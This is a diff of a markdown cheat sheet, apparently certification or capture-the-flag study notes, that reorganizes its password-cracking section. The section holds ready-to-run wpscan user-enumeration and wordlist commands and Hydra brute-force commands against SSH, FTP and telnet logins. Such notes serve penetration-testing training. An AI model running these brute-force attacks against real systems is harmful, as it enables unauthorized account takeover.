@@ -205,9 +205,11 @@ sdcard/Download/secret.txt
 
 # Password Cracking
 
-<details>
-  <summary>Password Cracking</summary>
 
+
+<details>
+  <summary>Wpscan</summary>
+  
 ## Wordpress
 
 * Wordpress site only Users Enumeration
@@ -216,29 +218,37 @@ wpscan --url http://example.com/ceh --enumerate u
 ```
   * Direct crack if we have user/password detail
 ```console
-wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
-wpscan --url http://ip:8080/CEH -u <user> -P ~/wordlists/password.txt
+wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
 ```
+</details>
+
+<details>
+  <summary>Hydra</summary>
+
 ## Hydra
+
 ### SSH
 ```console
-hydra -l username -P passlist.txt 192.168.0.100 ssh
+hydra -l username -P passlist.txt x.x.x.x ssh
 ```
 ### FTP
 ```console
-hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100
+hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
 ```
 * If the service isn't running on the default port, use -s
 ```console
-hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
+hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
 ```
 * FTP Get command
+* Used to download the specific file from FTP to attacker or local machine
 ```console
 get flag.txt ~/Desktop/filepath/flag.txt
+get flag.txt .
 ```
 ### TELNET
 ```console
-hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet
+hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
 ```  
 </details>
   
